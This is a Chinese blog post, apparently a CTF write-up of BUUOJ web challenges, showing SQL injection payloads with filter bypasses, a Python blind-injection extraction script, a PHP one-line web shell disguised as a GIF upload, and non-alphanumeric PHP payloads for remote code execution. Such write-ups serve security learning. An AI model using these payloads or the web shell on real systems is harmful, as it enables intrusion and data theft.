@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="blog" />
+   
+  <meta name="description" content="晴天`blog" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    buuoj刷题记录10-极客大挑战web2 |  晴天`blog
+  </title>
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="晴天`blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-buuoj刷题记录10-极客大挑战web2" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  buuoj刷题记录10-极客大挑战web2
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9510-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98web2/" class="article-date">
+  <time datetime="2020-01-24T15:37:07.000Z" itemprop="datePublished">2020-01-24</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+  </div>
+
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h2 id="极客大挑战web"><a href="#极客大挑战web" class="headerlink" title="极客大挑战web"></a>极客大挑战web</h2><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p>fuzz了一下发现过滤了空格，单引号报错。如果查询数据为空，返回密码错误</p>
+<p>常规操作</p>
+<a id="more"></a>
+
+<ol>
+<li><h4 id="order-by判断字段，字段为3"><a href="#order-by判断字段，字段为3" class="headerlink" title="order by判断字段，字段为3"></a>order by判断字段，字段为3</h4></li>
+</ol>
+<p><img src="/pic/38.png" alt=""></p>
+<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code></p>
+<p><img src="/pic/39.png" alt=""></p>
+<ol start="2">
+<li><h4 id="union确定回显，回显位置为2，3"><a href="#union确定回显，回显位置为2，3" class="headerlink" title="union确定回显，回显位置为2，3"></a>union确定回显，回显位置为2，3</h4></li>
+</ol>
+<p><code>?username=&#39;union+select+1,2,3+%23&amp;password=123</code></p>
+<p><img src="/pic/40.png" alt=""></p>
+<ol start="3">
+<li><h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4></li>
+</ol>
+<p><code>?username=&#39;union+select+1,database(),3+%23&amp;password=123</code></p>
+<p><img src="/pic/41.png" alt=""></p>
+<ol start="4">
+<li><h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4></li>
+</ol>
+<p><code>?username=&#39;union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=&#39;geek&#39;+%23&amp;password=123</code></p>
+<p><img src="/pic/42.png" alt=""></p>
+<p>l0ve1ysq1、geekuser</p>
+<ol start="5">
+<li><h4 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h4></li>
+</ol>
+<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;l0ve1ysq1&#39;+%23&amp;password=123</code></p>
+<p><img src="/pic/43.png" alt=""></p>
+<p><code>?username=&#39;union+select+1,group_concat(column_name),3+from+information_schema.columns+where+table_schema=&#39;geek&#39;+and+table_name=&#39;geekuser&#39;+%23&amp;password=123</code></p>
+<p><img src="/pic/44.png" alt=""></p>
+<ol start="6">
+<li><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4></li>
+</ol>
+<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+geekuser+limit+0,1+%23&amp;password=123</code></p>
+<p>geekuser只有一个admin</p>
+<p><img src="/pic/45.png" alt=""></p>
+<p>l0ve1ysq1表中发现了flag</p>
+<p><code>?username=&#39;union+select+1,group_concat(username,&#39;,&#39;,password),3+from+l0ve1ysq1+limit+0,1+%23&amp;password=123</code> </p>
+<p><img src="/pic/46.png" alt=""></p>
+<h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p>fuzzing一下，将union,select,and,or,where,from删除</p>
+<p>此时可以selselectect将select删除之后就变成了sel <del>select</del> ect</p>
+<p>因为和上面的一样，直接查询数据库</p>
+<ol>
+<li><h4 id="查数据库-1"><a href="#查数据库-1" class="headerlink" title="查数据库"></a>查数据库</h4></li>
+</ol>
+<p><code>?username=&#39;uniunionon+selselectect+1,database(),3--+&amp;password=123</code></p>
+<p>数据库名还是geek</p>
+<ol start="2">
+<li><h4 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h4></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;&#39;uniunionon+selselectect+1,group_concat(table_name),3+frfromom+infoorrmation_schema.tables+wwherehere+table_schema&#x3D;&#39;geek&#39;--+&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>b4bsql,geekuser</p>
+<ol start="3">
+<li><h4 id="查列名-1"><a href="#查列名-1" class="headerlink" title="查列名"></a>查列名</h4></li>
+</ol>
+<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(column_name),3+frfromom+infoorrmation_schema.columns+wwherehere+table_schema=&#39;geek&#39;+anandd+table_name=&#39;b4bsql&#39;--+&amp;password=123</code></p>
+<p>列名还是id,username,password</p>
+<ol start="4">
+<li><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4></li>
+</ol>
+<p><code>?username=&#39;uniunionon+selselectect+1,group_concat(username,passwoorrd),3+frfromom+b4bsql--+&amp;password=123</code></p>
+<p><img src="/pic/47.png" alt=""></p>
+<p>成功拿到flag</p>
+<h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p>打开BP，开启拦截，查看site map发现有一个secret.php</p>
+<p><img src="/pic/48.png" alt=""></p>
+<p>访问即可</p>
+<p>根据提示修改http头</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/Secret.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:27400</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">X-Forwarded-for:127.0.0.1</span></span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">Referer:https://www.Sycsecret.com</span></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Syclover/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
+
+<h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p>点进去有一个payflag界面,</p>
+<p>根据提示，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!! </span><br><span class="line"></span><br><span class="line">Only Cuit's students can buy the FLAG</span><br></pre></td></tr></table></figure>
+
+<p>页面最后有一段注释</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	~~~post money and password~~~</span></span><br><span class="line"><span class="comment">if (isset($_POST['password'])) &#123;</span></span><br><span class="line"><span class="comment">	$password = $_POST['password'];</span></span><br><span class="line"><span class="comment">	if (is_numeric($password)) &#123;</span></span><br><span class="line"><span class="comment">		echo "password can't be number&lt;/br&gt;";</span></span><br><span class="line"><span class="comment">	&#125;elseif ($password == 404) &#123;</span></span><br><span class="line"><span class="comment">		echo "Password Right!&lt;/br&gt;";</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这一段注释是对输入的<code>password</code>作比较，输入的是404，且能绕过<code>is_numeric()</code>函数。</p>
+<p>在数字之后面加一个字符就变成了字符串类型，即可绕过。最后面的是弱类型的判断，加了字符之后还是符合的</p>
+<p><img src="/pic/49.png" alt=""></p>
+<p>抓包发现有cookie, user=0，改成=1，变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Please input your password!!</span><br></pre></td></tr></table></figure>
+
+<p>传入数据<code>password=404a&amp;money=999999999</code>，他说数据太长，只能传入八位。</p>
+<p>之前在南邮的平台上做过一道pass check题目PHP版本是5.3，传入数组即可绕过</p>
+<p><code>password=404a&amp;money[]=</code></p>
+<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>上传PHP一句话被过滤</p>
+<p><img src="/pic/50.png" alt=""></p>
+<p>换成图片后缀jpg进行%00截断，还是被过滤</p>
+<p><img src="/pic/51.png" alt=""></p>
+<p>尝试php2,php3,php5都被过滤</p>
+<p><img src="/pic/52.png" alt=""></p>
+<p><img src="/pic/53.png" alt=""></p>
+<p><img src="/pic/54.png" alt=""></p>
+<p>只有phtml没有被过滤</p>
+<p><img src="/pic/55.png" alt=""></p>
+<p>内容不能出现<code>&lt;?</code>可以换成js的写法</p>
+<p><img src="/pic/56.png" alt=""></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再上传提示必须是图片，添加gif文件头<code>GIF89a</code></p>
+<p><img src="/pic/57.png" alt=""></p>
+<p>使用蚁剑，菜刀连接，找到flag</p>
+<p><img src="/pic/58.png" alt=""></p>
+<h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p>fuzz测试</p>
+<p><code>AND,BINARY,BY,CHAR,CHAR_LENGTH,CHARACTER,CHARACTER_LENGTH,CLASSIFIER,DROP,HAVING,INSERT,INTO,MODIFIES,NCHAR,NULLIF,SPECIFIC,SPECIFICTYPE,SUBSTRING,SUBSTRING_REGEX,UNION,VARBINARY,VARCHAR,+,/,!,*,||,&amp;&amp;,&lt;,&gt;,ascii,%20,%09</code>被过滤</p>
+<p>输入错误还会报出sql语句错误，考虑报错注入</p>
+<ol>
+<li><h4 id="查数据库-2"><a href="#查数据库-2" class="headerlink" title="查数据库"></a>查数据库</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(database())),0))%23</code>还是geek</p>
+</li>
+<li><h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0))%23</code></p>
+<p>H4rDsq1</p>
+</li>
+<li><h4 id="查列名（应该还是只有id-usname-password）"><a href="#查列名（应该还是只有id-usname-password）" class="headerlink" title="查列名（应该还是只有id,usname,password）"></a>查列名（应该还是只有id,usname,password）</h4></li>
+<li><h4 id="查数据-1"><a href="#查数据-1" class="headerlink" title="查数据"></a>查数据</h4><p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(concat(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>
+<p><code>?username=admin&#39;or(updatexml(0,concat(0,(select(reverse(password))from(H4rDsq1))),0))%23&amp;password=123</code></p>
+<p>因为flag超出了32个字符，floor报错注入能显示64个字符，但是by被过滤（本菜鸡找不到解决的办法）。 字符截取函数substr,mid被过滤，使用reverse函数。</p>
+</li>
+</ol>
+<h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><p>fuzz之后发现被过滤的关键字有</p>
+<p><img src="/pic/59.png" alt=""></p>
+<p>题目提示有盲注，还给了一个含有ID的界面。注入点再id处，不再是之前的输入框</p>
+<p><img src="/pic/60.png" alt=""></p>
+<p><img src="/pic/61.png" alt=""></p>
+<p>根据括号内的数字不同，返回的界面不同，和没被过滤的关键字可以使用盲注</p>
+<p>编写盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://f408e803-8b3e-4c4e-883e-3fb61e29303f.node3.buuoj.cn/search.php?id=1=('</span>+payload+<span class="string">')'</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print('*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'others'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">(db)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\''</span>+db+<span class="string">'\')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\''</span>+table+<span class="string">'\')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tabls('geek') #F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># get_columns('F1naI1y') # id,username,password</span></span><br><span class="line"><span class="comment"># get_columns('Flaaaaag') # id,fl4gawsl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_data('fl4gawsl','Flaaaaag')</span></span><br><span class="line">get_data(<span class="string">'id,username,password'</span>,<span class="string">'F1naI1y'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来有两个表F1naI1y,Flaaaaag</p>
+<p>F1naI1y表还是只有id,username,password</p>
+<p>Flaaaaag表包括id,fl4gawsl</p>
+<h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3><p>打开题目有源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;  </span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p> 传入一个code参数，长度不能大于40，不能包含大小写字母和数字</p>
+<p>可以使用取反或者异或拼凑函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~?&gt;);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;_&#x3D;phpinfo()&amp;__&#x3D;assert</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%A0%AF%B0%AC%AB是_GET的取反的值，$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;)&#96;就相当于 $_GET&#123;&#39;__&#39;&#125;($_GET&#123;&#39;_&#39;&#125;)   联合起来就是assert(phpinfo())</span><br></pre></td></tr></table></figure>
+
+
+
+<p>关于assert函数**</p>
+<p>PHP 5 assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$assertion</code> [, string <code>$description</code> ] ) : bool</p>
+<p>PHP 7 assert ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$assertion</code> [, Throwable <code>$exception</code> ] ) : bool</p>
+<p><strong>assert()</strong> 会检查指定的 <code>assertion</code> 并在结果为 <strong><code>FALSE</code></strong> 时采取适当的行动。</p>
+<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。 <code>assertion</code> 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 <code>assertion</code> 表达式。 这意味着如果你传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的 <a href="https://www.php.net/manual/zh/function.assert-options.php" target="_blank" rel="noopener">assert_options()</a> 处理函数时，条件会转换为字符串，而布尔值 <strong><code>FALSE</code></strong> 会被转换成空字符串。</p>
+<p><img src="/pic/64.png" alt=""></p>
+<p>先查看phpinfo()</p>
+<p><img src="/pic/62.png" alt=""></p>
+<p>禁用了很多执行系统命令的函数</p>
+<p><img src="/pic/63.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure>
+
+<p>扫描当前目录 </p>
+<p>post 数据： <code>_=print_r(scandir(%27./%27))&amp;__=assert</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array (    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; index.php )</span><br></pre></td></tr></table></figure>
+
+<p>扫描根目录</p>
+<p>post数据：<code>_=print_r(scandir(%27/%27))&amp;__=assert</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var )</span><br></pre></td></tr></table></figure>
+
+<p>发现有一个flag文件和一个readflag文件。尝试读取内容</p>
+<p>读取flag中的文件是空的；</p>
+<p>post数据：<code>_=var_dump(file_get_contents(%27/flag%27))&amp;__=assert</code></p>
+<p>post数据：<code>_=var_dump(file_get_contents(%27/readflag%27))&amp;__=assert</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(8856) &quot;ELF&gt;�@�@8 @@@@��888  � � � x� � � � ��TTTDDP�td���&lt;&lt;Q�tdR�td� � � ((&#x2F;lib64&#x2F;ld-linux-x86-64.so.2GNU GNU�íf­CI�&#96;[Xa���V�Q ?m 8| � )&quot;!libc.so.6setuidsetegidsystemseteuid__cxa_finalizesetgid__libc_start_main_ITM_deregisterTMCloneTable__gmon_start___Jv_RegisterClasses_ITM_registerTMCloneTableGLIBC_2.2.5ui �� �� &#96;H H � � � � � �     ( 0  8 H��H�� H��t��H����5� �%� @�%� h������%� h������%� h������%� h�����%� h�����%b f�1�I��^H��H���PTL��H� sH�&#x3D;� �DH�&#x3D;y H�y UH)�H��H��vH�� H��t ]��fD]�@f.�H�&#x3D;9 H�52 UH)�H��H��H��H��?H�H��tH�� H��t]��f�]�@f.��&#x3D;� u&#39;H�&#x3D;� UH��tH�&#x3D;� � ����H���]�� ��@f.�H�&#x3D;A H�?u�^���fDH�) H��t�UH����]�@���UH����������~������_������@���H�&#x3D;�������]�f.�f�AWAVA��AUATL�%� UH�-� SI��I��L)�H��H������H��t 1��L��L��D��A��H��H9�u�H��[]A\A]A^A_Ðf.���H��H���&#x2F;bin&#x2F;cat &#x2F;flag;8l�������������T����l��������,zRx�����+zRx�$����&#96;FJw�?;*3$&quot;D���\@���TA�C OD|����eB�B�E �B(�H0�H8�M@r8A0A(B BBB������&#96; �� � ���o��� � x��� ���o���o����o���o����o� FVfv�H GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 201705168Tt����� � �0 ����� � � � � �  @ P ��� �.&#96;DP S� z��� ������ �� ���� �� �� ��  �0 � @ LP *�Sg�@ � �H ���0e�X ��+�P ��T�� P  -A&quot;�]rcrtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6972__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryreadflag.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable_edatasystem@@GLIBC_2.2.5__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmainsetgid@@GLIBC_2.2.5_Jv_RegisterClasses__TMC_END___ITM_registerTMCloneTablesetuid@@GLIBC_2.2.5__cxa_finalize@@GLIBC_2.2.5setegid@@GLIBC_2.2.5seteuid@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.comment88#TT 1tt$D���o��N�� V���^���o��k���o�� z����B��x��00&#96;��������� ������&lt;� �� � �� � �� � �� � ��� �0� @�@ @�P P0P-��&#x2F; @��&quot;</span><br></pre></td></tr></table></figure>
+
+<p>是linux可执文件</p>
+<p>连接蚁剑 payload :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;$_&#x3D;(~%A0%B8%BA%AB);$$_&#123;%27__%27&#125;($$_&#123;%27_%27&#125;);&amp;__&#x3D;assert&amp;_&#x3D;eval($_POST[&#39;cmd&#39;])</span><br></pre></td></tr></table></figure>
+
+<p>应该是要绕过disable_function,从而执行readflag，项目地址</p>
